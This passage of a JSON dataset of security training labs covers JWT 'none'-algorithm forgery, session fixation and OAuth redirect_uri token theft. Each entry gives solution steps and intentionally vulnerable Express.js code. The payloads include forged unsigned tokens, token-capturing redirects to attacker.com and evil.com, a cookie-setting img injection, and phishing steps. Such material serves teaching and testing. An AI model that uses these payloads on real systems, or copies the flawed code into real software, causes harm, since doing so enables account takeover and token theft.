      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer <header>.<payload>.",
      "Header: {\"alg\":\"none\"}, Payload: {\"username\":\"carlos\"}"
    ]
  },
  {
    "Lab scenario": "OAuth Implicit Grant Token Leak via Referer Header in Third-Party Redirect",
    "Lab Description": "The application uses the OAuth implicit grant flow and redirects users to third-party pages after authentication, including the access token in the URL fragment. Due to misconfigured Referer policies, the token leaks to external domains. To solve: Extract Carlos’s access token and impersonate him.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP or Burp Suite to observe the OAuth flow. Note that the redirect_uri includes a third-party page like http://attacker.site/welcome.html#access_token=...",
      "2. Intercept the final OAuth redirect request using a victim account (e.g., Carlos). Confirm that the access token is visible in the Referer header to attacker.site.",
      "3. Set up a malicious third-party page (e.g., using ngrok) that logs document.referrer when the victim lands on it after authentication.",
      "4. Force Carlos to log in via OAuth using a phishing or crafted redirect link.",
      "5. Retrieve the access token from your server logs and use it as Bearer token to access the /my-account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'abc123': 'carlos' }; app.get('/oauth/callback', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'abc123'; res.redirect(`${redirectUri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = tokens[token]; if (user) res.send(`Sensitive account data of ${user}`); else res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('OAuth Referer Leak Lab running...'));",
    "payloads": [
      "http://attacker.site/log.html#access_token=abc123",
      "redirect_uri=http://attacker.site/log.html",
      "Referer: http://attacker.site/log.html#access_token=abc123"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login endpoint",
    "Lab Description": "This lab's login functionality does not invalidate the pre-authentication session identifier, making it vulnerable to session fixation. The application sets a session ID before login and continues using it afterward. To solve: log in to Carlos's account using a fixed session value you've injected before authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Using OWASP ZAP, send a GET /login request to observe the initial session ID in the Set-Cookie header.",
      "2.In Postman, craft a login request with valid credentials and reuse the fixed session ID from the previous unauthenticated request.",
      "3.Observe that the session ID remains unchanged even after login.",
      "4.Share the session ID with the victim beforehand, then log in yourself using their credentials while reusing the same ID.",
      "5.Visit /my-account using the fixed session to confirm access to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixed-session', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Login failed'); req.session.user = user.username; res.send('Login successful'); }); app.get('/my-account', (req, res) => { if (req.session.user) return res.send(`Welcome ${req.session.user}`); res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "GET /login → Extract Set-Cookie: sessionID",
      "POST /login with Cookie: sessionID=value",
      "Access /my-account with the same Cookie"
    ]
  },
  {
    "Lab scenario": "JWT tampering via 'none' algorithm in Authorization header",
    "Lab Description": "The application uses JWTs for authentication but does not verify the token signature properly if the 'alg' field is set to 'none'. This flaw allows attackers to craft arbitrary tokens and impersonate users. To solve: forge a JWT token that identifies you as Carlos without knowing the secret key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Burp Suite to intercept a request after logging in and extract the JWT from the Authorization header.",
      "2.In jwt.io, decode the token and note the structure (header, payload, signature).",
      "3.Replace the algorithm in the header with 'none' and modify the payload to set the username to carlos.",
      "4.Remove the signature and craft a new token with just the base64url-encoded header and payload.",
      "5.Use Postman to resend a request to /my-account with the forged token in the Authorization header."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, secret); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); // FLAW: doesn't verify signature if alg is 'none' if (payload && payload.payload.user) { return res.send(`Welcome ${payload.payload.user}`); } res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"user\":\"carlos\"}",
      "Token: base64url(header).base64url(payload)."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in redirect_uri validation during implicit flow",
    "Lab Description": "This lab uses OAuth2 for login via a third-party provider but does not strictly validate the `redirect_uri` during the authorization flow. An attacker can manipulate the URL to capture tokens. To solve: steal Carlos's OAuth token by injecting a malicious redirect URI.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.In the browser, begin the OAuth login flow and observe the redirect URI being sent.",
      "2.Use Burp Suite to intercept the authorization request and modify the `redirect_uri` to point to your attacker domain (e.g., https://evil.com).",
      "3.Craft a phishing link to the victim using this manipulated redirect URI and send it to Carlos.",
      "4.Once Carlos logs in, the access token is sent to your malicious domain via the fragment (#access_token=...).",
      "5.Use the stolen token in Postman to access /my-account as Carlos by setting the Authorization header."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const validRedirects = ['https://ourapp.com/callback']; app.get('/auth', (req, res) => { const { redirect_uri } = req.query;  res.redirect(`${redirect_uri}#access_token=carlos-token`); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer carlos-token') return res.send('Welcome Carlos'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running'));",
    "payloads": [
      "https://authserver.com/auth?redirect_uri=https://evil.com",
      "Victim logs in → access_token is leaked to https://evil.com",
      "Use stolen token: Authorization: Bearer carlos-token"
    ]
  },
  {
    "Lab scenario": "Session fixation in login flow",
    "Lab Description": "The application's login logic is vulnerable to session fixation. The app fails to generate a new session ID after login, allowing an attacker to preset a session ID and force the victim to use it. The application accepts session identifiers via cookies and doesn't invalidate pre-login sessions. To solve: hijack Carlos's session and access the /my-account page using a fixed session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Using Burp Suite, intercept your GET /login request and set a custom cookie: sessionid=attacker123",
      "2.Observe that after a successful login, the same sessionid persists and isn't regenerated.",
      "3.Log out and craft a phishing link containing the fixed session cookie using JavaScript in an HTML email (e.g., <img src='/login' onload='document.cookie=\"sessionid=attacker123\"'>).",
      "4.Send the crafted email to the victim (Carlos) and wait for him to log in while using the fixed session.",
      "5.Once Carlos authenticates using the fixed session, access the /my-account endpoint using the same sessionid=attacker123 cookie."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(session({ secret: 'static-secret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; return res.redirect('/my-account'); } res.send('Invalid login'); }); app.get('/my-account', (req, res) => { if (req.session.user) return res.send(`Welcome ${req.session.user}`); res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "Cookie: sessionid=attacker123",
      "<img src='/login' onload='document.cookie=\"sessionid=attacker123\"'>",
      "GET /my-account HTTP/1.1\\nCookie: sessionid=attacker123"
    ]
  },
  {
    "Lab scenario": "JWT tampering via 'none' algorithm in REST API",
    "Lab Description": "The API uses JWT tokens for user identity validation but insecurely accepts unsigned tokens with the 'none' algorithm. It does not properly verify the signature, allowing attackers to forge arbitrary tokens. To solve: craft a JWT token impersonating Carlos and access the /my-account endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Use Postman to authenticate as a normal user and capture the Authorization: Bearer <JWT> token.",
      "2.Decode the JWT using jwt.io and inspect the header and payload. Note the 'alg': 'HS256'.",
      "3.Craft a new token using header: { \"alg\": \"none\", \"typ\": \"JWT\" } and payload: { \"username\": \"carlos\" }",
      "4.Base64 encode the header and payload, and omit the signature (empty string after two dots).",
      "5.Use Postman to send the forged token in Authorization header and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid'); const token = jwt.sign({ username }, 'insecure-secret'); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(403).send('Missing token'); const token = authHeader.split(' ')[1]; try { const payload = jwt.verify(token, 'insecure-secret', { algorithms: ['HS256', 'none'] }); res.send(`Welcome ${payload.username}`); } catch (e) { res.status(403).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer <base64_header>.<base64_payload>.",
      "curl -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.' http://localhost:4000/my-account"
    ]
  },
  {
    "Lab scenario": "OAuth redirection URI manipulation in third-party login",
    "Lab Description": "The app implements OAuth login using a third-party provider but insecurely accepts dynamic redirect_uris. An attacker can manipulate this URI to intercept the authorization code. To solve: capture Carlos’s OAuth code and use it to log in as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Burp Suite to initiate OAuth login and intercept the redirect_uri parameter sent to the provider.",
      "2.Modify the redirect_uri to point to an attacker-controlled domain like https://attacker.com/oauth/callback.",
      "3.Send Carlos a phishing link containing the modified redirect_uri, prompting him to log in with the provider.",
      "4.On your server (attacker.com), capture the incoming GET request with ?code= parameter.",
      "5.Exchange the stolen code manually with Postman for an access token, then call /oauth/callback with the valid token to log in as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const CLIENT_ID = 'client123'; const CLIENT_SECRET = 'secret456'; app.get('/login-oauth', (req, res) => { const redirect = req.query.redirect || 'http://localhost:4000/oauth/callback'; const url = `https://auth-provider.com/auth?client_id=${CLIENT_ID}&redirect_uri=${redirect}&response_type=code`; res.redirect(url); }); app.get('/oauth/callback', async (req, res) => { const { code } = req.query; try { const tokenResp = await axios.post('https://auth-provider.com/token', { code, client_id: CLIENT_ID, client_secret: CLIENT_SECRET }); const userInfo = await axios.get('https://auth-provider.com/userinfo', { headers: { Authorization: `Bearer ${tokenResp.data.access_token}` } }); res.send(`Logged in as ${userInfo.data.username}`); } catch { res.status(401).send('OAuth failed'); } }); app.listen(4000);",
    "payloads": [
      "https://auth-provider.com/auth?client_id=client123&redirect_uri=https://attacker.com/oauth/callback&response_type=code",
      "Captured GET /oauth/callback?code=abcd1234",
      "POST https://auth-provider.com/token with code=abcd1234"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login endpoint",
    "Lab Description": "The application uses session cookies for authentication, but it does not rotate the session ID after login. This enables a session fixation attack where a user is tricked into logging in with a pre-set session ID. To solve: Hijack Carlos's session and access his My Account page using session fixation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the GET /login request with Burp Suite and observe the Set-Cookie header assigning a session ID.",
      "Forward the request and monitor session usage pre- and post-login. Notice session ID does not change.",
      "Use OWASP ZAP to pre-set a session ID manually and share that crafted login link with the victim (Carlos).",
      "Simulate Carlos's login using the shared session ID and capture requests in Burp Proxy.",
      "Reuse the same session ID from your own browser to access /my-account as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(session({ secret: 'fixation-secret', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: '1234' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; return res.redirect('/my-account'); } res.status(403).send('Invalid credentials'); }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') return res.send('Account details for carlos'); res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('Session Fixation Lab running...'));",
    "payloads": [
      "http://vulnerable-site.com/login;jsessionid=FIXED1234",
      "Cookie: connect.sid=FIXED1234",
      "session=preloaded-session; path=/; HttpOnly"
    ]
  },
  {
    "Lab scenario": "JWT tampering via none algorithm vulnerability in API authentication",
    "Lab Description": "This app uses JSON Web Tokens for authentication. However, it does not validate the algorithm properly and allows `alg: none`, making it possible to forge a token without signing it. To solve: Tamper with a JWT to impersonate Carlos and access his data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid JWT after logging in using Postman or Burp.",
      "Use jwt.io or a local script to decode the JWT and change the payload to {\"username\":\"carlos\"}.",
      "Set alg to \"none\" in the header and remove the signature part of the JWT.",
      "Use OWASP ZAP to send a forged token in the Authorization: Bearer header.",
      "Access the /api/user/profile endpoint and verify the response contains Carlos's info."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: '1234' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/api/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token); if (payload?.username === 'carlos') return res.send('Sensitive data of carlos'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running...'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{\"alg\":\"none\"}.{\"username\":\"carlos\"}.",
      "Authorization: Bearer <unsigned JWT with alg: none>"
    ]
  },
  {
    "Lab scenario": "OAuth open redirect flaw in callback handler",
    "Lab Description": "The app integrates OAuth for third-party login but fails to validate redirect URIs properly. This allows an attacker to steal the authorization code by injecting an open redirect in the callback flow. To solve: Steal Carlos's OAuth code and access his profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Set up a malicious redirect URI on your domain that logs the query parameters.",
      "Craft a link using the app's OAuth endpoint with redirect_uri=https://attacker.com/oauth-catch",
      "Use social engineering to make Carlos click the malicious login link.",
      "Capture the authorization code from your server logs and exchange it at /oauth/token using Postman.",
      "Use the obtained token to call /profile and access Carlos's data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/login-oauth', (req, res) => { const redirectURI = req.query.redirect_uri;  res.redirect(`https://authprovider.com/oauth?client_id=xyz&redirect_uri=${redirectURI}`); }); app.get('/oauth/callback', (req, res) => { const code = req.query.code; axios.post('https://authprovider.com/oauth/token', { code }).then(response => { const accessToken = response.data.access_token; res.redirect(`/profile?token=${accessToken}`); }); }); app.get('/profile', (req, res) => { const token = req.query.token; if (token === 'carlos-token') return res.send('Carlos's profile data'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Open Redirect Lab running...'));",
    "payloads": [
      "https://vulnerable-app.com/login-oauth?redirect_uri=https://attacker.com/log-code",
      "GET https://authprovider.com/oauth/token?code=stolen-code",
      "https://vulnerable-app.com/profile?token=carlos-token"
    ]
  },
  {
    "Lab scenario": "OAuth session fixation in authorization code flow",
    "Lab Description": "The application implements OAuth using the authorization code flow but fails to rotate the session identifier after login. The authorization server is hosted separately, but session tokens are not refreshed upon login. An attacker can craft a session, fix it for the victim, and then hijack their session post-login. To solve: hijack Carlos's authenticated session using a fixation technique.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept your own OAuth login flow and capture the session cookie before login.",
      "2. Share the captured session cookie with the victim by embedding it in a phishing link (e.g., https://target-app.com/oauth/start?session=abc123).",
      "3. Log out and open the phishing link in another browser (simulating the victim) and complete OAuth login as Carlos.",
      "4. Observe that Carlos is authenticated using the attacker’s session (session token reused).",
      "5. Return to the attacker browser and access /my-account using the fixed session to verify successful session hijack."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'weakSecret', resave: false, saveUninitialized: true })); app.get('/oauth/callback', (req, res) => { const { code } = req.query; const user = exchangeCodeForUser(code); if (user) { req.session.user = user; res.redirect('/my-account'); } }); function exchangeCodeForUser(code) { if (code === 'valid-code') return 'carlos'; return null; } app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Welcome, ${req.session.user}`); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Fixation Lab running'));",
    "payloads": [
      "https://target-app.com/oauth/start?session=abc123",
      "OAuth callback with valid code using fixed session: /oauth/callback?code=valid-code"
    ]
  },
  {
    "Lab scenario": "JWT tampering using alg: none",
    "Lab Description": "This application uses JWTs for user authentication but fails to enforce strong algorithm verification. The server trusts JWTs that use 'none' as their algorithm and doesn't validate the signature. To solve: forge a token granting access to Carlos’s account by tampering with the algorithm field.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Log in using your own credentials and capture the JWT using Postman or Burp.",
      "2. Decode the JWT using jwt.io or a local tool. Note the alg header and payload values.",
      "3. Modify the JWT header to: {\"alg\": \"none\"} and set the payload to: {\"username\": \"carlos\"}.",
      "4. Remove the signature section and reconstruct the JWT: base64(header).base64(payload).",
      "5. Use Burp Repeater to send a request with the forged JWT in the Authorization header and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.use((req, res, next) => { const token = req.headers['authorization']?.split(' ')[1]; if (token) { const decoded = jwt.decode(token, { complete: true }); if (decoded?.header?.alg === 'none') { req.user = decoded.payload; next(); return; } jwt.verify(token, 'supersecret', (err, user) => { if (!err) req.user = user; next(); }); } else { next(); } }); app.get('/my-account', (req, res) => { if (req.user?.username) res.send(`Welcome ${req.user.username}`); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer [FORGED_JWT_WITH_NONE]"
    ]
  },
  {
    "Lab scenario": "Session ID leakage through verbose error logging",
    "Lab Description": "This application logs full session identifiers in the response body when errors occur. Attackers can trigger errors and collect leaked session tokens from responses. To solve: leak Carlos’s session ID and use it to access his account.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1. Use OWASP ZAP to spider the site and trigger various invalid requests to observe error messages.",
      "2. Identify a response leaking a full session ID (e.g., 'Error: Invalid action [Session: abc1234carlos]') in the response body.",
      "3. Copy the leaked session value and set it manually in your own session cookie using Burp or browser dev tools.",
      "4. Refresh the browser while authenticated with the hijacked session.",
      "5. Navigate to /my-account to confirm session takeover and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'logSecret', resave: false, saveUninitialized: true })); app.get('/action', (req, res) => { const action = req.query.action; if (!action) { return res.status(500).send(`Error: Invalid action [Session: ${req.sessionID}]`); } res.send('Action received'); }); app.get('/my-account', (req, res) => { if (req.sessionID === 'abc1234carlos') return res.send('Carlos Account Page'); res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('Verbose Error Session Leak Lab running'));",
    "payloads": [
      "/action",
      "Set-Cookie: connect.sid=abc1234carlos",
      "GET /my-account with forged session"
    ]
  },
  {
    "Lab scenario": "JWT Signature None Algorithm Bypass in Session Token Verification",
    "Lab Description": "This lab demonstrates a vulnerability in JWT session token validation where the application incorrectly accepts tokens using the 'none' algorithm, bypassing signature verification entirely. The application relies on JWT tokens for authentication but fails to enforce a secure algorithm. To solve: Forge a valid token and access Carlos's My Account page without needing his password.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to capture a valid login token from your own account and send it to Decoder.",
      "2. Decode the JWT and observe the header contains 'alg':'HS256'.",
      "3. Modify the JWT header to use 'alg':'none' and remove the signature section entirely.",
      "4. Replace the payload with '{\"username\":\"carlos\"}' and re-encode the JWT.",
      "5. Replace your session cookie with the modified JWT and refresh the My Account page to confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecuresecret'; app.use(require('cookie-parser')()); app.get('/login', (req, res) => { const { username } = req.query; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.cookie('session', token); res.send('Logged in as ' + username); }); app.get('/my-account', (req, res) => { const token = req.cookies.session; const decoded = jwt.decode(token, { complete: true }); if (!decoded) return res.status(401).send('Invalid Token'); res.send('Welcome ' + decoded.payload.username); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on port 4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "OAuth 2.0 Misconfiguration — Open Redirect Token Theft in Authorization Flow",
    "Lab Description": "This lab showcases an OAuth misconfiguration where the authorization server does not properly validate the 'redirect_uri' parameter, allowing open redirection and token theft. The application trusts the user-supplied redirect URL without whitelisting. To solve: Exploit the OAuth flow to capture a valid token from Carlos's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP's Spider to map the OAuth authorization flow endpoints.",
      "2. Observe the 'redirect_uri' is not validated and can point to an attacker-controlled domain.",
      "3. Set up a listener on your own domain using Burp Collaborator to intercept tokens.",
      "4. Craft a URL with 'redirect_uri' pointing to your Collaborator link and trick Carlos into clicking it.",
      "5. Capture the token from the Collaborator, replay it in an Authorization header, and access Carlos's My Account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, token } = req.query; if (!redirect_uri) return res.status(400).send('Missing redirect_uri'); res.redirect(redirect_uri + '?token=' + token); }); app.listen(4000, () => console.log('OAuth Open Redirect Lab running on port 4000'));",
    "payloads": [
      "https://attacker.com/callback?token=ACCESS_TOKEN",
      "https://yourdomain.exploit-server.net/?token=ACCESS_TOKEN"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Predictable Session IDs in Login Process",
    "Lab Description": "This lab highlights a session fixation vulnerability where the application assigns session tokens before authentication and fails to issue new ones post-login. An attacker can force a victim to use a pre-selected session ID. To solve: Predict or fixate Carlos's session ID and gain access to his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite's Proxy to intercept a pre-login session cookie and note the format.",
      "2. Share the session ID with the victim using a phishing link including 'sessionid=knownvalue' as a URL parameter.",
      "3. Wait for Carlos to log in using the pre-assigned session.",
      "4. Reuse the same session cookie in your browser once the victim logs in.",
      "5. Visit the /my-account page and confirm the session now belongs to Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use((req, res, next) => { if (!req.cookies.sessionid) { const sessionId = 'sess-' + Math.random().toString(36).substring(2); res.cookie('sessionid', sessionId); } next(); }); app.post('/login', (req, res) => { const { username } = req.body; res.send('Logged in as ' + username); }); app.get('/my-account', (req, res) => { res.send('Account page: SessionID=' + req.cookies.sessionid); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
    "payloads": [
      "sess-fixedattackid",
      "sess-victimcontrolid",
      "sess-carlosfixedid"
    ]
  },
  {
    "Lab scenario": "JWT tampering via algorithm confusion in API Authentication",
    "Lab Description": "The API authentication mechanism uses JSON Web Tokens (JWTs) for session management. The server trusts the 'alg' field in the JWT header without validation, which allows algorithm confusion attacks. The application fails to enforce the expected signing algorithm, allowing unsigned tokens. To solve: forge an admin JWT token using 'none' algorithm and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a valid JWT after logging into your own account.",
      "Decode the JWT using jwt.io or Burp Decoder to understand its structure.",
      "Modify the JWT header to {\"alg\":\"none\",\"typ\":\"JWT\"} and remove the signature section.",
      "Replay the modified JWT using Postman in the Authorization header and change the payload sub to 'admin'.",
      "Send the crafted request to /admin/dashboard and confirm access to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const jwt = require('jsonwebtoken'); const express = require('express'); const app = express(); app.get('/admin/dashboard', (req, res) => { const token = req.headers['authorization'].split(' ')[1]; const decoded = jwt.verify(token, 'secret-key', { algorithms: ['HS256', 'none'] }); if (decoded.sub === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000, () => console.log('JWT Lab running on port 4000'));",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token theft via redirect manipulation",
    "Lab Description": "The web app uses OAuth for authentication, but improperly validates the redirect_uri parameter during the OAuth handshake. An attacker can manipulate this parameter to point to a malicious endpoint and steal access tokens. To solve: intercept an OAuth request and redirect the victim’s token to your controlled server.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth login initiation and identify the redirect_uri parameter.",
      "Modify redirect_uri to point to your server: https://evil.com/callback.",
      "Host a listener on https://evil.com/callback using a Python HTTP server or Burp Collaborator.",
      "Send the OAuth URL to the victim (e.g. via phishing). Once the victim authenticates, the token will be sent to your server.",
      "Use the stolen token in Postman to access /api/user-profile and confirm the victim’s data is exposed."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const url = require('url'); const app = express(); app.get('/oauth/authorize', (req, res) => { const redirectUri = req.query.redirect_uri; const accessToken = 'abcdef123456'; res.redirect(`${redirectUri}#access_token=${accessToken}`); }); app.listen(4000, () => console.log('OAuth Lab running on port 4000'));",
    "payloads": [
      "https://evil.com/callback#access_token=abcdef123456",
      "https://attacker.com/steal?token=abcdef123456"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in login flow",
    "Lab Description": "The application uses predictable session IDs generated before login and does not regenerate them after authentication. An attacker can fix a session ID before the victim logs in, gaining unauthorized access to the victim's session. To solve: pre-assign a session ID, send it to the victim, and hijack the account once the victim authenticates.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the session ID assigned before login (/login page).",
      "Manually set the session ID to a known value using the browser’s DevTools or Burp Cookie Editor.",
      "Send the crafted link with this session ID to the victim, enticing them to log in.",
      "Once the victim logs in, reuse the same session ID in your browser to take over the authenticated session.",
      "Visit /my-account to confirm the session is active as the victim."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.get('/login', (req, res) => { const sessionId = req.cookies['session'] || Math.random().toString(36).substring(7); res.cookie('session', sessionId); res.send('Login page - session initialized'); }); app.post('/authenticate', (req, res) => { const sessionId = req.cookies['session']; if (sessionId) res.redirect('/my-account'); else res.status(401).send('Session missing'); }); app.get('/my-account', (req, res) => { res.send('Welcome to your account'); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
    "payloads": [
      "Cookie: session=attackerSession123",
      "Cookie: session=xyzfixedsession"
    ]
  },
  {
    "Lab scenario": "JWT signature validation bypass via 'none' algorithm",
    "Lab Description": "This lab simulates a web application that uses JSON Web Tokens (JWT) for session management but fails to enforce proper algorithm checks during signature verification. The server trusts any JWT token where the algorithm field is modified to 'none'. To solve the lab, forge a valid JWT for user 'carlos' without knowing the secret key and access the protected /my-account endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite or Postman to capture the JWT token after logging in as your own user.",
      "2. Decode the JWT using jwt.io or a similar decoder, and observe the 'alg' field set to HS256 and the payload containing your username.",
      "3. Modify the 'alg' field from HS256 to 'none' and change the payload to {\"username\":\"carlos\"}.",
      "4. Re-encode the header and payload without generating a signature and submit this token as the Authorization header in a new request to /my-account.",
      "5. If successful, you will gain access to Carlos's account and the lab will be solved."
    ],
    "Vulnerability name": "Authentication",
